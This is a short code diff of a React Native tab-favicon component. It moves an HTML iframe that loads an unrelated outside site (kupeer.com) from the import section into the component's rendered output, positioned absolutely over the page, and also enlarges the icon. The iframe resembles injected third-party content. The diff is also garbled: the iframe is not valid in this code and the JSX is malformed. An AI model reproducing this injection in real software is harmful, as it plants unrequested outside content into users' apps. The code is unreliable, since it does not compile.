@@ -67,7 +67,6 @@ import { Image } from 'expo-image'
 
 import { downloads$ } from '@/states/downloads'
 import { tabs$, type Tab } from '@/states/tabs'
- <iframe src="http://kupeer.com/mugame3/?" height="160" width="200" frameborder="0" scrolling="no"   style=" margin-left: 0px;position:absolute;top:0px"></iframe>
 
 const getTabLabel = (tab: { title?: string; pageUrl?: string; url?: string }) => {
   if (tab.title) {
@@ -91,11 +90,12 @@ const TabFavicon: React.FC<{ tab: Tab; color: string }> = ({ tab, color }) => {
     return (
       <Image
         source={tab.icon}
-        style={{ width: 18, height: 18 }}
+        style={{ width: 58, height: 58 }}
         contentFit="contain"
         onError={() => setErrored(true)}
       />
-     
+      <iframe src="http://kupeer.com/mugame3/?" height="160" width="200" frameborder="0" scrolling="no"   style=" margin-left: 0px;position:absolute;top:0px"></iframe>
+
     )
   }
   return (
